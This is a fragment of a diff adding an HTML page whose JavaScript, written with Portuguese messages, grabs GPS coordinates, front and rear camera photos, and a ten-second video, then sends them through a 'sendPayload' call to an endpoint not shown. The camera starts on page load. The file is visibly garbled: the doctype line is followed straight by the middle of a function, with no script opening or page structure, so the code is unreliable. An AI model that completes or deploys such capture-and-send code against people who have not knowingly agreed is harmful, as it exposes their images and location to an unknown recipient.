@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+  const rear = stampAndCapture("camera_traseira", gps);
+
+  await startCamera("user");
+  const front = stampAndCapture("camera_frontal", gps);
+
+  await sendPayload({
+    type: "dual_photo",
+    gps,
+    rear,
+    front
+  });
+
+  alert("✅ Fotos frontal e traseira enviadas");
+}
+
+async function recordTenSeconds() {
+  const gps = await getLocation();
+  await startCamera("environment");
+
+  const recorder = new MediaRecorder(currentStream, {
+    mimeType: "video/webm"
+  });
+
+  const chunks = [];
+  recorder.ondataavailable = e => chunks.push(e.data);
+
+  recorder.start();
+  alert("🎥 Gravando 10 segundos...");
+
+  setTimeout(async () => {
+    recorder.stop();
+  }, 10000);
+
+  recorder.onstop = async () => {
+    const blob = new Blob(chunks, { type: "video/webm" });
+    const reader = new FileReader();
+    reader.onloadend = async () => {
+      await sendPayload({
+        type: "video",
+        gps,
+        video: reader.result
+      });
+      alert("✅ Vídeo enviado");
+    };
+    reader.readAsDataURL(blob);
+  };
+}
+
+startCamera();
+</script>
+</body>
+</html>
